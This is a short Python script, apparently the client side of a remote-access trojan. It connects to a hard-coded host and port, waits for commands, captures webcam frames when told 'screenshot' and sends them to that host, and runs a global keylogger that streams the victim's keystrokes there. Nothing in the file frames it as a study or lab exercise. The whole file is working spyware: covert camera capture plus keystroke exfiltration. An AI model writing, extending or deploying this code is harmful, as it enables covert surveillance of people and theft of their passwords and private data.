import socket, cv2, threading, keyboard

SERVER_HOST, SERVER_PORT, BUFFER_SIZE = "172.20.10.3", 4000, 1024 * 128
s = socket.socket(); s.connect((SERVER_HOST, SERVER_PORT))

class Command:
    def execute(self):
        while (cmd := s.recv(BUFFER_SIZE).decode()) != "exit":
            if cmd == "screenshot": Screenshot().start()
        s.close()

class Screenshot:
    def start(self):
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            s.sendall(b"image"); s.recv(1024)
            s.sendall(f"{len(enc := cv2.imencode('.jpg', frame)[1].tobytes())}".encode())
            s.recv(1024); s.sendall(enc)
        cap.release(); cv2.destroyAllWindows()

class Keys:
    def start(self):
        keyboard.on_release(lambda e: s.sendall((e.name if len(e.name) == 1 or e.name == "backspace" else ' ').encode()))
        keyboard.wait()

threading.Thread(target=Command().execute).start()
threading.Thread(target=Keys().start).start()
